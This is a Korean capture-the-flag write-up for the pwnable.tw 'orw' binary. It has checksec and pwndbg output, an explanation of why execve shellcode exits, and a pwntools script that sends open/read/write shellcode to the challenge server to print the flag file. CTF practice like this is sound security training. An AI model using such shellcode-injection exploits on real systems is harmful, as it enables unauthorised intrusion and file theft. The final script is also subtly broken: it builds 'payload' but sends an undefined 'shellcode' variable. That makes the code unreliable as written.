# analysis
```css
m444ndu@ubuntu:~/pwntw/orw$ checksec orw 
[*] '/home/m444ndu/pwntw/orw/orw'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
그냥 쉘코드 올리고 실행시켜주는 문제인데, 그냥 쉘코드를 만들 수 있는가를 테스트하는 문제인 것 같다.

  

근데 그냥 아무 `execve("/bin/sh",NULL,0)` 해주는 쉘코드를 올리면 이상하게 아래와 같이 `sys_exit` 함수로 끝내버린다...?
```css
pwndbg>
0x0804a07a in shellcode ()

LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
*EAX 0x1
EBX 0xffee6c10 ◂— '/bin//sh'
ECX 0x0
EDX 0x0
EDI 0xf7ec2000 (_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x1d /* 0x1b1db0 */
ESI 0xf7ec2000 (_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x1d /* 0x1b1db0 */
EBP 0xffee6c28 ◂— 0x0
ESP 0xffee6c10 ◂— '/bin//sh'
*EIP 0x804a07a (shellcode+26) ◂— int 0x80 /* 0x414180cd */
───────────────────────────────────[ DISASM ]───────────────────────────────────
0x804a071 <shellcode+17> mov edx, eax
0x804a073 <shellcode+19> mov al, 0xb
0x804a075 <shellcode+21> int 0x80
0x804a077 <shellcode+23> xor eax, eax
0x804a079 <shellcode+25> inc eax
► 0x804a07a <shellcode+26> int 0x80 <SYS_exit>
status: 0xffee6c10 ◂— '/bin//sh'
0x804a07c <shellcode+28> inc ecx
0x804a07d <shellcode+29> inc ecx
0x804a07e <shellcode+30> inc ecx
0x804a07f <shellcode+31> inc ecx
0x804a080 <shellcode+32> inc ecx
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ ebx esp 0xffee6c10 ◂— '/bin//sh'
01:0004│ 0xffee6c14 ◂— '//sh'
02:0008│ 0xffee6c18 ◂— 0x0
03:000c│ 0xffee6c1c —▸ 0x804858c (main+68) ◂— mov eax, 0
04:0010│ 0xffee6c20 —▸ 0xf7ec23dc (__exit_funcs) —▸ 0xf7ec31e0 (initial) ◂— 0
05:0014│ 0xffee6c24 —▸ 0xffee6c40 ◂— 0x1
06:0018│ ebp 0xffee6c28 ◂— 0x0
07:001c│ 0xffee6c2c —▸ 0xf7d28637 (__libc_start_main+247) ◂— add esp, 0x10
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
► f 0 804a07a shellcode+26
f 1 6e69622f
f 2 68732f2f
f 3 0
pwndbg>
[Inferior 1 (process 51799) exited with code 020]
```
  
<br/>
문제에서 힌트로 알려줬다시피 `open`, `read`, `write` 함수를 이용해서 그냥 플래그를 출력하게 하는 쉘코드를 실행시키면 편하게 되는 문제이다.

우리에게는 `pwntools` 라는 갓갓툴이 있으니 유용하게 사용해주자. 그냥 대충 `bss 영역` 아무데나에 플래그를 읽어놓고 출력한다.
# exploit
```python
#! /usr/bin/python
from pwn import *

#r = process('./orw')
r = remote('chall.pwnable.tw',10001)
#gdb.attach(r,'b* 0x804858a')

payload = ''
payload += asm(shellcraft.open("/home/orw/flag"))
payload += asm(shellcraft.read("eax",0x804a450,0x100)) # bss 0x804a450
payload += asm(shellcraft.write(1,0x804a450,0x100))
r.sendlineafter('Give my your shellcode:',shellcode)

r.interactive()
```
  
